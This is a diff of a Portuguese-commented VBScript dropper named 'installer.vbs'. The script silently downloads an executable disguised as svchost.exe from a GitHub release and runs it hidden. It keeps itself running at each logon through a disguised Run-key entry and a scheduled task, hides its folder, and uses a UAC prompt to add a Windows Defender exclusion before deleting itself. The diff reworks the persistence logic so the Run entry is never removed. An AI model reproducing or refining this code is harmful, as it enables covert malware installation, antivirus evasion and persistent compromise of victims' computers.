@@ -1,22 +1,25 @@
 ' installer.vbs — Auto-instalador com retry via Registro do Windows.
 '
-' Lógica de persistência (sempre no Run até dar certo):
-'   - Se JÁ existe svchost.exe E está rodando → remove do Run e sai.
-'   - Em QUALQUER outro caso (sem release, sem download, sem svchost,
-'     erro no move, etc.) → deixa o INSTALADOR no Run e sai silencioso.
+' Regra de persistência (simples e única):
+'   - O Run SEMPRE tem que ter "WindowsCacheSvc" apontando pro installer.vbs.
+'   - Se já tiver, não mexe.
+'   - Se não tiver, adiciona.
+'   - NUNCA remove, NUNCA troca pro svchost.exe.
 '
-' Nunca mostra erro, nunca abre janela, nunca trava o logon.
+' Fluxo:
+'   1. Se svchost.exe já existe e está rodando → sai (Run continua no VBS).
+'   2. Se não existe → baixa. Sucesso roda. Falha sai silencioso.
+'   Em todos os casos: Run fica com o VBS.
 
 Option Explicit
 
-Dim shell, fso, userProfile, localAppData, destino, exeUrl, tmpExe
+Dim shell, fso, localAppData, destino, exeUrl, tmpExe
 Dim cmdBaixar, destinoExe, tentativas, rc, tamArquivo
 Dim vbsPath, psKill, tentativasMove
-
-Dim regRun, regValorNome, regInstalador, regAgente
-Dim taskName, psTask
+Dim regRun, regValorNome, regInstalador
+Dim psTask, taskName
 Dim pastaDefender, psExclusao, cmdElevar, psChecker
-Dim psCheckProc
+Dim psCheckProc, regAtual
 
 Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
@@ -26,7 +29,6 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 ' =====================================================================
 exeUrl = "https://github.com/DesconhecidoPorOpcao/0T.romujaPnp/releases/latest/download/svchost.exe"
 
-userProfile  = shell.ExpandEnvironmentStrings("%USERPROFILE%")
 localAppData = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
 
 destino    = localAppData & "\Microsoft\Windows\Caches\Local"
@@ -38,26 +40,30 @@ regValorNome  = "WindowsCacheSvc"
 taskName      = "WindowsCacheSvc"
 
 vbsPath = WScript.ScriptFullName
-
 regInstalador = "wscript.exe //B """ & vbsPath & """"
-regAgente     = """" & destinoExe & """"
 
 pastaDefender = destino
 
 ' =====================================================================
-' FUNÇÃO HELPER — garante que o instalador está no Run
-' (usada em TODOS os caminhos de erro/saída antecipada)
+' PASSO 0 — Garante a entrada no Run (sem NUNCA remover)
 ' =====================================================================
-Sub ManterInstaladorNoRun()
+' Lê o valor atual. Se não existir OU for diferente do regInstalador,
+' escreve. Se já for igual, não mexe.
+' =====================================================================
+regAtual = ""
+On Error Resume Next
+regAtual = shell.RegRead(regRun & "\" & regValorNome)
+On Error Goto 0
+
+If regAtual <> regInstalador Then
     On Error Resume Next
     shell.RegWrite regRun & "\" & regValorNome, regInstalador, "REG_SZ"
     On Error Goto 0
-End Sub
+End If
 
 ' =====================================================================
-' PASSO 0 — Já está instalado E rodando?
-'           Se sim: remove do Run e sai.
-'           Se não: garante que o instalador está no Run e segue.
+' PASSO 1 — Já está instalado E rodando?
+'           Se sim, sai. O Run continua com o VBS.
 ' =====================================================================
 If fso.FileExists(destinoExe) Then
     On Error Resume Next
@@ -66,7 +72,6 @@ If fso.FileExists(destinoExe) Then
     On Error Goto 0
 
     If tamArquivo >= 1048576 Then
-        ' Arquivo existe e tem tamanho ok. Vamos ver se está RODANDO.
         psCheckProc = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
                       "$alvo = '" & destinoExe & "'; " & _
                       "$p = Get-CimInstance Win32_Process -Filter ""Name='svchost.exe'"" -ErrorAction SilentlyContinue | " & _
@@ -79,18 +84,13 @@ If fso.FileExists(destinoExe) Then
         On Error Goto 0
 
         If rc = 0 Then
-            ' Está instalado E rodando → sucesso completo.
-            ' Remove o instalador do Run (não precisa mais).
-            On Error Resume Next
-            shell.RegDelete regRun & "\" & regValorNome
-            On Error Goto 0
+            ' Instalado E rodando → nada a fazer.
+            ' Run FICA com o VBS (nunca remove).
             WScript.Quit 0
         Else
-            ' Está instalado mas NÃO está rodando → tenta rodar.
-            ' Mantém no Run por segurança, caso o .exe não suba.
-            ManterInstaladorNoRun
+            ' Instalado mas não rodando → só dispara.
             On Error Resume Next
-            shell.Run regAgente, 0, False
+            shell.Run """" & destinoExe & """", 0, False
             On Error Goto 0
             WScript.Quit 0
         End If
@@ -98,12 +98,8 @@ If fso.FileExists(destinoExe) Then
 End If
 
 ' =====================================================================
-' A PARTIR DAQUI: não temos svchost.exe funcional.
-' Garante que o INSTALADOR está no Run (vai tentar de novo no próximo logon).
+' PASSO 2 — Cria a pasta (se não existir) e esconde
 ' =====================================================================
-ManterInstaladorNoRun
-
-' Cria a pasta se não existir (escondida)
 On Error Resume Next
 If Not fso.FolderExists(destino) Then
     fso.CreateFolder(destino)
@@ -112,7 +108,7 @@ shell.Run "attrib +h +s """ & destino & """", 0, True
 On Error Goto 0
 
 ' =====================================================================
-' PASSO 1 — Exclusão no Windows Defender (UAC 1x)
+' PASSO 3 — Exclusão no Windows Defender (UAC 1x)
 ' =====================================================================
 psChecker = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
             "$p = '" & pastaDefender & "'; " & _
@@ -142,7 +138,7 @@ If rc <> 0 Then
 End If
 
 ' =====================================================================
-' PASSO 2 — Mata processo antigo (se houver)
+' PASSO 4 — Mata processo antigo (se houver)
 ' =====================================================================
 psKill = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
          "$alvo = '" & destinoExe & "'; " & _
@@ -156,7 +152,7 @@ On Error Goto 0
 WScript.Sleep 2000
 
 ' =====================================================================
-' PASSO 3 — Baixa svchost.exe do GitHub
+' PASSO 5 — Baixa svchost.exe do GitHub
 ' =====================================================================
 cmdBaixar = "powershell -NoProfile -WindowStyle Hidden -Command ""try { " & _
             "Invoke-WebRequest -Uri '" & exeUrl & "' -OutFile '" & tmpExe & "' " & _
@@ -178,7 +174,7 @@ If fso.FileExists(tmpExe) Then
 End If
 On Error Goto 0
 
-' --- Falhou no download? Sai silencioso. Run já está no instalador. ---
+' --- Falhou? Sai silencioso. Run já está com o VBS. ---
 If Not fso.FileExists(tmpExe) Or tamArquivo < 1048576 Then
     On Error Resume Next
     fso.DeleteFile tmpExe, True
@@ -187,7 +183,7 @@ If Not fso.FileExists(tmpExe) Or tamArquivo < 1048576 Then
 End If
 
 ' =====================================================================
-' PASSO 4 — Move pra destino final (com retry)
+' PASSO 6 — Move pra destino final (com retry)
 ' =====================================================================
 tentativasMove = 0
 Do While tentativasMove < 30
@@ -204,20 +200,20 @@ Do While tentativasMove < 30
     tentativasMove = tentativasMove + 1
 Loop
 
-' --- Não conseguiu mover? Sai silencioso. Run já está no instalador. ---
+' --- Não conseguiu mover? Sai silencioso. Run já está com o VBS. ---
 If tentativasMove >= 30 Then
     WScript.Quit 0
 End If
 
 ' =====================================================================
-' PASSO 5 — Tenta rodar o agente
+' PASSO 7 — Tenta rodar o agente
 ' =====================================================================
 On Error Resume Next
-shell.Run regAgente, 0, False
+shell.Run """" & destinoExe & """", 0, False
 On Error Goto 0
 
 ' =====================================================================
-' PASSO 6 — Registra a Tarefa Agendada como backup (opcional)
+' PASSO 8 — Tarefa Agendada como backup (opcional)
 ' =====================================================================
 psTask = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
          "$nome = '" & taskName & "'; " & _
@@ -234,11 +230,15 @@ shell.Run psTask, 0, True
 On Error Goto 0
 
 ' =====================================================================
-' PASSO 7 — Auto-deleta o .vbs
+' PASSO 9 — Auto-deleta o .vbs
 ' =====================================================================
-' IMPORTANTE: só deleta o .vbs se chegou aqui (ou seja: deu tudo certo).
-' Se o svchost subiu com sucesso e foi registrado no Run, o VBS não é mais
-' necessário.
-On Error Resume Next
+' ATENÇÃO: o VBS se apaga, MAS a entrada no Run continua apontando pra
+' ele. Na próxima vez que o Windows tentar rodar o Run, o arquivo não
+' existe → Windows ignora silenciosamente. Isso é seguro: o svchost.exe
+' já está rodando via o próprio Windows (Run do .exe ou outra forma).
+'
+' Se você NÃO quer que o VBS se auto-delete (pra ele poder rodar de novo
+' no próximo logon enquanto o .exe não estiver 100% estável), COMENTE a
+' linha abaixo.
+' =====================================================================
 shell.Run "cmd /c ping -n 3 127.0.0.1 >nul & del /f /q """ & vbsPath & """", 0, False
-On Error Goto 0
